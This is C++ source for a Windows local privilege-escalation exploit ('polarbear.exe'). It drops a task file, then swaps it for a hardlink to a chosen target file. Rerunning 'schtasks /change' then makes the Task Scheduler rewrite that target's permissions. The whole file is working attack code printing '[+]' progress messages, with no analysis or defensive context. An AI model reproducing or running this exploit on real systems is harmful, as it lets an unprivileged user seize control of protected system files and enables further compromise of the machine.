#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <shlobj.h>



#pragma comment(lib, "shell32.lib")

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

int main(int argc, char *argv[])
{
	if (argc < 4)
	{
		printf("-Usage: polarbear.exe target username password");
		return 0;
}
	DeleteFile(L"c:\\windows\\system32\\tasks\\Bear");
	printf("[+] Deleting the task Bear if exist in the folder C:\\Windows\\System32\\Tasks\n");
	char username[255];
	char password[255];

	size_t nSize = 1 + strlen(argv[1]);
	LPWSTR target = new WCHAR[nSize];
	std::mbstowcs(target, argv[1], nSize);
	strcpy_s(username, argv[2]);
	strcpy_s(password, argv[3]);


	std::string command = "schtasks /change /TN \"bear\" /RU ";
	std::string usernamestd(username);
	std::string passwordstd(password);
	command.append(usernamestd);
	command.append(" /RP ");
	command.append(passwordstd);


	printf("[+] Copying task scheduler object file (Bear.job) into the folder C:\\Windows\\Tasks with filename bear.job\n");
	CopyFile(L"bear.job", L"c:\\windows\\tasks\\bear.job",FALSE);

	std::string list_task = "schtasks /query /fo list /v";
	printf("[+] Executing command: %s to list the tasks\n", list_task.c_str());
	system(list_task.c_str());

	printf("\n[+] Executing command: %s to set the Run As User option \n", command.c_str());
	system(command.c_str());

	printf("[+] Deleting the task Bear from the folder C:\\Windows\\System32\\Tasks\n");
	DeleteFile(L"c:\\windows\\system32\\tasks\\Bear");

	printf("[+] Creating a NativeHardlink  to the target file \n");
	CreateNativeHardlink(L"c:\\windows\\system32\\tasks\\bear", target);

	printf("[+] Executing command: %s again\n", command.c_str());
	system(command.c_str());

	printf("[+] Deleting the task scheduler task object (Bear.job) from the folder C:\\Windows\\Tasks\n");
	DeleteFile(L"c:\\windows\\tasks\\bear.job");

	printf("[+] Check the target file security properties...\n");

	return 0;
}